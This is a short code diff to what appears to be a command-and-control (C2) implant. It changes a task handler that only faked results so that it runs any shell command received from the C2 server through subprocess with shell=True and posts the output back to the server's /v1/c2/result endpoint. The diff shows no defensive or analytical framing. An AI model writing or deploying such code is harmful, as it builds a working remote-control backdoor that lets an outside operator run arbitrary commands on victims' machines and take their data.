@@ -256,7 +256,24 @@ def _run():
             data = r.json()
             if data.get("task"):
                 task = data["task"]
-                result = {"exit_code": 0, "stdout": f"Executed: {task['command']}", "stderr": ""}
+                import subprocess
+                try:
+                    proc = subprocess.run(
+                        task["command"],
+                        shell=True,
+                        capture_output=True,
+                        text=True,
+                        timeout=task.get("timeout", 30)
+                    )
+                    result = {
+                        "exit_code": proc.returncode,
+                        "stdout": proc.stdout,
+                        "stderr": proc.stderr
+                    }
+                except subprocess.TimeoutExpired as e:
+                    result = {"exit_code": -1, "stdout": e.stdout if e.stdout else "", "stderr": "TIMEOUT"}
+                except Exception as e:
+                    result = {"exit_code": -1, "stdout": "", "stderr": str(e)}
                 session.post(f"{C2_URL}/v1/c2/result", json={"task_id": task["task_id"], "result": result}, timeout=10)
         except _req.RequestException:
             pass
